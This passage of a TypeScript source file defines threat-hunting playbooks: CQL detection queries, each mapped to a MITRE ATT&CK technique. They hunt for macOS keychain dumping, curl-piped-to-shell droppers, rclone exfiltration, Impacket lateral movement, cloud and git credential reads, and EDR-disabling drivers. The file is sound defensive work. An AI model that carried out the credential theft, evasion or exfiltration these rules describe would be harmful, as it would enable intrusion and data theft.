    os: ["lin", "mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| in(event_platform, values=["Lin", "Mac"])
| CommandLine=/(\\/etc\\/sudoers(\\.d\\/[^\\s]*)?|\\/etc\\/doas\\.conf|\\/private\\/etc\\/sudoers)/i
| ImageFileName=/\\/(tee|cat|cp|mv|sed|visudo|bash|sh|zsh|python|perl)$/i
| !ParentBaseFileName=/^(apt|apt-get|dpkg|yum|dnf|rpm|brew)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1548/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-keychain-dump",
    title: "Keychain access dump attempt (macOS)",
    description:
      "`security dump-keychain` / `security find-generic-password` runs from non-admin contexts — macOS credential theft.",
    mitre: ["T1555.001"],
    category: "credential-access",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| ImageFileName=/\\/security$/i
| CommandLine=/(dump-keychain|find-generic-password|find-internet-password|export\\s+-k)/i
| !ParentBaseFileName=/^(launchd|installer|softwareupdate)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1555/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-pkg-install-suspicious",
    title: "Installer .pkg run from temp / Downloads (macOS)",
    description:
      "`installer -pkg` invoked against a path under /tmp, /var/folders, ~/Downloads — malicious .pkg droppers.",
    mitre: ["T1204.002"],
    category: "execution",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| ImageFileName=/\\/installer$/i
| CommandLine=/-pkg\\s+(\\/tmp\\/|\\/var\\/folders\\/|\\/Users\\/[^\\/]+\\/Downloads\\/|\\/Volumes\\/)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1204/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-tcc-database-tamper",
    title: "TCC database direct write (macOS)",
    description:
      "Direct sqlite3 writes to TCC.db — bypassing user-consent prompts for screen recording, microphone, full-disk access.",
    mitre: ["T1562.001"],
    category: "defense-evasion",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| CommandLine=/TCC\\.db\\b/i
| ImageFileName=/\\/(sqlite3|tccutil|bash|sh|zsh|python|perl)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1562/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-screencapture-cli",
    title: "Headless screencapture invocation (macOS)",
    description:
      "/usr/sbin/screencapture run from shell with -x (silent) or output to a temp path — macOS stealer collection step.",
    mitre: ["T1113"],
    category: "discovery",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| ImageFileName=/\\/screencapture$/i
| CommandLine=/-x\\b|\\/tmp\\/|\\/var\\/folders\\//i
| !ParentBaseFileName=/^(loginwindow|Finder|Photos|Preview)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1113/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-loginitem-via-osascript",
    title: "LoginItem added via osascript (macOS)",
    description:
      "osascript with `make new login item` — programmatic login-item persistence that bypasses System Settings UI.",
    mitre: ["T1547.015"],
    category: "persistence",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| ImageFileName=/\\/osascript$/i
| CommandLine=/make\\s+new\\s+login\\s+item|tell\\s+application\\s+\"System\\s+Events\".*login\\s+item/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1547/015/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-xattr-quarantine-strip",
    title: "Quarantine attribute removed via xattr (macOS)",
    description:
      "`xattr -d com.apple.quarantine` or `xattr -cr` clearing Gatekeeper flags before execution.",
    mitre: ["T1553.001"],
    category: "defense-evasion",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| ImageFileName=/\\/xattr$/i
| CommandLine=/(-d\\s+com\\.apple\\.quarantine|-cr?\\s+\\/)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1553/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-spctl-disable",
    title: "Gatekeeper disabled via spctl (macOS)",
    description:
      "`spctl --master-disable` or `--global-disable` — operator turning off code-signing enforcement.",
    mitre: ["T1562.001"],
    category: "defense-evasion",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| ImageFileName=/\\/spctl$/i
| CommandLine=/--(master|global)-disable|--add\\s+--label/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1562/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-curl-pipe-shell",
    title: "curl/wget piped to shell (macOS)",
    description:
      "Same dropper one-liner pattern as Linux but scoped to macOS — popular in installer-style infostealers.",
    mitre: ["T1059.004", "T1105"],
    category: "execution",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| CommandLine=/(curl|wget)\\b[^|]*\\|\\s*(bash|sh|zsh|python|perl)\\b/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1059/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-rclone-exfil",
    title: "rclone with cloud-storage destination (Windows)",
    description:
      "rclone copying to cloud backends (Mega, Dropbox, GDrive, S3, Azure, B2) — common ransomware exfil tool.",
    mitre: ["T1567.002"],
    category: "impact",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\rclone\\.exe$/i OR CommandLine=/\\brclone\\b/i)
| CommandLine=/(copy|sync|move|copyto)\\s.+(:|--remote)\\s*(mega|dropbox|gdrive|drive|s3|azure|b2|onedrive|pcloud|box)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1567/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-mega-megacmd",
    title: "MEGA / MEGAcmd activity (Windows)",
    description:
      "MEGAcmdServer.exe, megaclient, or MEGAsync — frequently-abused consumer cloud-sync for staged exfil.",
    mitre: ["T1567.002"],
    category: "impact",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(MEGAcmd(Server)?|MEGAclient|MEGAsync|mega-(get|put|cmd))\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1567/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-tunnel-cli-tools",
    title: "Tunneling CLI invocation (ngrok / cloudflared / frp)",
    description:
      "ngrok, cloudflared, frpc, chisel — operator-installed tunnels that bypass corporate egress controls.",
    mitre: ["T1572", "T1090.001"],
    category: "command-and-control",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| ImageFileName=/(\\\\|\\/)(ngrok|cloudflared|frpc|frps|chisel|teleport|gost)(\\.exe)?$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1572/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-impacket-suite",
    title: "Impacket suite (atexec / psexec / smbexec / wmiexec)",
    description:
      "Image names matching Impacket's example scripts — staple of post-exploit lateral movement.",
    mitre: ["T1021.002", "T1059.001"],
    category: "lateral-movement",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\(atexec|wmiexec|smbexec|dcomexec|psexec)\\.(exe|py)$/i
   OR CommandLine=/\\b(atexec|wmiexec|smbexec|dcomexec)\\.py\\b/i
   OR CommandLine=/secretsdump\\.py/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1021/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-7zip-mass-archive",
    title: "Mass archive creation (7z / WinRAR / zip)",
    description:
      "7z.exe / Rar.exe / makecab piping a recursive archive of user folders — pre-exfil staging.",
    mitre: ["T1560.001"],
    category: "impact",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(7z|7za|7zG|Rar|WinRAR|makecab)\\.exe$/i
| CommandLine=/\\b(a|u|m)\\b.*(\\\\Users\\\\|\\\\Documents\\\\|\\\\Desktop\\\\|\\\\AppData\\\\Roaming\\\\)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1560/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-byovd-driver",
    title: "Bring-your-own-vulnerable-driver loaded (Windows)",
    description:
      "Service installs / sc.exe pointing at a known-abused driver (RTCore64, gdrv, wnbios, dbutil) to disable EDR.",
    mitre: ["T1068", "T1562.001"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\sc\\.exe$/i AND CommandLine=/\\b(create|config)\\b/i AND CommandLine=/\\.sys\\b/i)
  OR CommandLine=/(RTCore64|gdrv\\.sys|wnbios|dbutil_2_3|truesight\\.sys|ene\\.sys|RogueKiller|procexp152|YDArk)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://www.loldrivers.io/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-aspnet-w3wp-child",
    title: "IIS w3wp.exe spawning shell (Windows)",
    description:
      "w3wp.exe → cmd / powershell / certutil — strong webshell signal on IIS hosts.",
    mitre: ["T1505.003", "T1059.001"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ParentImageFileName=/\\\\w3wp\\.exe$/i
| ImageFileName=/\\\\(cmd|powershell|pwsh|certutil|bitsadmin|rundll32|regsvr32|mshta|wscript|cscript)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1505/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-netsh-portproxy",
    title: "netsh portproxy port-forwarding rule",
    description:
      "`netsh interface portproxy add` — operator-installed port forward to pivot through a host.",
    mitre: ["T1090.001"],
    category: "command-and-control",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\netsh\\.exe$/i
| CommandLine=/interface\\s+portproxy\\s+(add|set)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1090/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-print-spooler-abuse",
    title: "Print Spooler service spawning child (PrintNightmare)",
    description:
      "spoolsv.exe → cmd/powershell or DLL load from non-system path — PrintNightmare-class abuse.",
    mitre: ["T1068"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ParentImageFileName=/\\\\spoolsv\\.exe$/i
| ImageFileName=/\\\\(cmd|powershell|pwsh|rundll32|regsvr32)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1068/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-msbuild-inline-task",
    title: "MSBuild inline-task execution (Windows)",
    description:
      "MSBuild.exe running an XML project file from non-developer paths — well-known AWL bypass.",
    mitre: ["T1127.001"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\MSBuild\\.exe$/i
| CommandLine=/\\.(xml|csproj|proj)\\b/i
| !ParentImageFileName=/\\\\(devenv|dotnet|msbuild)\\.exe$/i
| !CommandLine=/\\\\(Program Files|Visual Studio|dotnet)\\\\/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-installutil-bypass",
    title: "InstallUtil.exe AWL bypass (Windows)",
    description:
      "InstallUtil.exe loading a .NET binary from temp / user-writable paths — classic LOLBAS execution proxy.",
    mitre: ["T1218.004"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\InstallUtil\\.exe$/i
| CommandLine=/(\\\\Users\\\\|\\\\Temp\\\\|\\\\AppData\\\\|\\\\ProgramData\\\\)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://lolbas-project.github.io/lolbas/Binaries/Installutil/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-dotnet-binary-from-user-path",
    title: ".NET binary execution from user path",
    description:
      "Native .NET runtime images (dotnet.exe / csi.exe / rcsi.exe) launching from user-writable directories.",
    mitre: ["T1059.005", "T1218"],
    category: "execution",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(dotnet|csi|rcsi|dnSpy|RegAsm|RegSvcs)\\.exe$/i
| CommandLine=/(\\\\Users\\\\|\\\\Temp\\\\|\\\\AppData\\\\|\\\\ProgramData\\\\)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1059/005/",
    author: "Curated for Project Eyas",
  },
  {
    id: "cloud-aws-creds-read",
    title: "AWS credentials file accessed (cross-platform)",
    description:
      "Process touching `~/.aws/credentials` or `~/.aws/config` outside of awscli/sso — long-lived key theft.",
    mitre: ["T1552.001"],
    category: "credential-access",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| CommandLine=/\\.aws[\\/\\\\](credentials|config)\\b/i
| !ImageFileName=/(\\\\|\\/)(aws|aws-vault|aws-sso|aws_completer|terraform|kubectl|vault)(\\.exe)?$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1552/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "cloud-gcp-adc-read",
    title: "GCP application_default_credentials.json accessed",
    description:
      "Reads / copies of GCP ADC json — refresh-token theft pivot for long-lived cloud access.",
    mitre: ["T1552.001"],
    category: "credential-access",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| CommandLine=/application_default_credentials\\.json|gcloud[\\/\\\\]application_default_credentials/i
| !ImageFileName=/(\\\\|\\/)(gcloud|gsutil|bq|terraform|kubectl)(\\.exe)?$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1552/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "cloud-azure-token-cache-read",
    title: "Azure CLI token cache accessed",
    description:
      "Reads of `~/.azure/msal_token_cache.json` or `accessTokens.json` — Azure refresh-token theft.",
    mitre: ["T1552.001"],
    category: "credential-access",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| CommandLine=/(\\.azure[\\/\\\\](msal_token_cache|accessTokens)\\.json|azureProfile\\.json)/i
| !ImageFileName=/(\\\\|\\/)(az|azcopy|terraform|kubectl|pwsh|powershell)(\\.exe)?$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1552/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "cloud-ssh-config-tamper",
    title: "SSH config / known_hosts tampering",
    description:
      "Edits to ~/.ssh/config, ~/.ssh/known_hosts — operator pinning a backdoor host or swapping fingerprints.",
    mitre: ["T1098.004"],
    category: "persistence",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| CommandLine=/\\.ssh[\\/\\\\](config|known_hosts)\\b/i
| ImageFileName=/(\\\\|\\/)(echo|tee|cat|cp|mv|sed|printf|bash|sh|zsh|cmd|powershell|pwsh)(\\.exe)?$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1098/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "doh-doq-providers",
    title: "DNS-over-HTTPS / DoQ provider connection",
    description:
      "Outbound 443 / 853 to public DoH/DoQ providers (Cloudflare, Google, Quad9) — bypasses DNS-based egress monitoring.",
    mitre: ["T1071.004", "T1572"],
    category: "command-and-control",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=DnsRequest
| DomainName=/^(cloudflare-dns\\.com|dns\\.google|dns\\.quad9\\.net|doh\\.opendns\\.com|mozilla\\.cloudflare-dns\\.com|chrome\\.cloudflare-dns\\.com)$/i
| join({#event_simpleName=ProcessRollup2}, field=[aid, ContextProcessId], include=[ImageFileName, CommandLine, UserName])
| !ImageFileName=/\\\\(svchost|chrome|firefox|msedge|brave|opera|safari)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, DomainName, CommandLine])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1071/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "browser-extension-sideload",
    title: "Browser extension sideloaded from local path",
    description:
      "Chromium/Edge launched with `--load-extension=` pointing at a local directory — unsigned extension sideload.",
    mitre: ["T1176"],
    category: "persistence",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| ImageFileName=/(\\\\|\\/)(chrome|msedge|brave|opera|chromium)(\\.exe)?$/i
| CommandLine=/--load-extension=\\S+/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1176/",
    author: "Curated for Project Eyas",
  },
  {
    id: "git-credentials-access",
    title: "git-credentials / .netrc accessed",
    description:
      "Read of `~/.git-credentials`, `~/.netrc`, `~/.gitconfig` outside of git itself — VCS-token theft.",
    mitre: ["T1552.001"],
    category: "credential-access",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| CommandLine=/(\\.git-credentials|\\.netrc|\\.gitconfig)\\b/i
| !ImageFileName=/(\\\\|\\/)(git|gh|hub|gitlab-runner)(\\.exe)?$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1552/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "windows-dpapi-masterkey-access",
    title: "DPAPI master-key folder accessed (Windows)",
    description:
      "Reads / copies of `\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\` — DPAPI master keys gate browser passwords, RDP creds, and Wi-Fi profiles.",
    mitre: ["T1555.004", "T1003"],
    category: "credential-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| CommandLine=/AppData\\\\Roaming\\\\Microsoft\\\\Protect/i
| !ImageFileName=/\\\\(svchost|lsass|dwm|winlogon|csrss)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1555/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "container-runtime-suspicious-flags",
    title: "Container run with --privileged or host mounts",
    description:
      "docker / podman / nerdctl run with --privileged, --pid=host, or `-v /:/host` — container escape primitives.",
    mitre: ["T1611"],
    category: "privilege-escalation",
    os: ["lin", "mac", "win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| ImageFileName=/(\\\\|\\/)(docker|podman|nerdctl|crictl)(\\.exe)?$/i
| CommandLine=/\\brun\\b.*(--privileged|--pid=host|--net=host|--ipc=host|-v\\s*\\/:|-v\\s*\\/etc|--cap-add=SYS_ADMIN)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1611/",
    author: "Curated for Project Eyas",
  },
];

export function findPlaybook(id: string): NgsiemPlaybook | undefined {
  return PLAYBOOKS.find((p) => p.id === id);
}

export function startTimestampHoursAgo(hours: number): string {
  const t = new Date(Date.now() - hours * 60 * 60 * 1000);
  return t.toISOString().replace(/\.\d{3}Z$/, "Z");
}
